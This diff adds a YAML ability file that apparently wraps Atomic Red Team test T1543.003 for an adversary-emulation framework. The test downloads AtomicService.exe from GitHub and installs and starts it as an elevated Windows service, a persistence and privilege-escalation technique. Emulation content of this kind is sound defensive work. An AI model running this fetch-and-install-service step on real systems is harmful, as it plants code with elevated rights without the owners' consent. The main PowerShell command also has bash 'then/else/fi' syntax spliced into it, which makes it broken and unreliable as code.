@@ -1,0 +1,61 @@
+- id: 491a4af6-a521-4b74-b23b-f7b3f1ee9e77
+  name: Service Installation PowerShell
+  description: 'Installs A Local Service via PowerShell.
+
+    Upon successful execution, powershell will download `AtomicService.exe` from github.
+    Powershell will then use `New-Service` and `Start-Service` to start service. Results
+    will be displayed.'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1543.003
+    name: 'Create or Modify System Process: Windows Service'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"
+          -OutFile "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe"; fi; New-Service
+          -Name "AtomicTestService_PowerShell" -BinaryPathName "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe";
+          Start-Service -Name "AtomicTestService_PowerShell"'
+        cleanup: Stop-Service -Name "#{service_name}" 2>&1 | Out-Null; try {(Get-WmiObject
+          Win32_Service -filter "name='#{service_name}'").Delete()}; catch {}
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - t1543.003
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      binary_path:
+        description: Name of the service binary, include path.
+        type: path
+        default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
+      service_name:
+        description: Name of the Service
+        type: string
+        default: AtomicTestService_PowerShell
+    dependencies:
+    - description: 'Service binary must exist on disk at specified location (#{binary_path})
+
+        '
+      prereq_command: 'if (Test-Path "#{binary_path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{binary_path}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"
+        -OutFile "#{binary_path}"
+
+        '
+    technique_created: '2020-01-17T19:13:50.402Z'
+    atomic_guid: 491a4af6-a521-4b74-b23b-f7b3f1ee9e77
+    import_timestamp: '2025-06-24T11:15:01.814517Z'
